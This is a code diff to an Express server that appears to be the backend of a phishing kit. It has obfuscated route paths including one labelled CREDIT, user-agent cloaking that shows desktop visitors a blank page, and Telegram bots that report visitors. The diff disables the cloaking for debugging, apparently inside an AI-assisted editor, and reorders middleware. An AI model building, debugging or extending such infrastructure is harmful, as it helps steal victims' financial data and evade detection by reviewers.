@@ -21,20 +21,24 @@ const ROUTES = {
     CREDIT: '/FiNaLPaGeXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWx'
 };
 
+// Middleware
+app.use(cors());
+app.use(bodyParser.json());
+app.use(express.static(__dirname)); // Move this to the top to serve assets correctly
+
 // Middleware for Mobile Detection
 const mobileCheck = (req, res, next) => {
     const ua = req.headers['user-agent'];
+    // Allow visualization in Trae (Temporarily for debugging)
+    next();
+    /*
     if (/mobile|android|iphone|ipad|phone/i.test(ua)) {
         next();
     } else {
         res.send(''); // Send empty response (blank screen)
     }
+    */
 };
-
-// Middleware
-app.use(cors());
-app.use(bodyParser.json());
-app.use(express.static('public')); // Serve assets if any
 
 // Initialize Telegram Bots
 const visitorBot = new TelegramBot(VISITOR_BOT_TOKEN, { polling: false }); // No polling needed for just sending
@@ -92,7 +96,7 @@ app.get('/', (req, res) => {
     res.redirect(ROUTES.INDEX);
 });
 
-// Serve static assets (JS, CSS, IMG) freely but block direct HTML access
+// Block direct HTML access after routes
 app.use((req, res, next) => {
     if (req.path.endsWith('.html')) {
         res.status(404).send('Not Found');
@@ -100,8 +104,6 @@ app.use((req, res, next) => {
         next();
     }
 });
-
-app.use(express.static(__dirname)); // Serve other static files like js, css, img
 
 // Logging Middleware
 app.use((req, res, next) => {
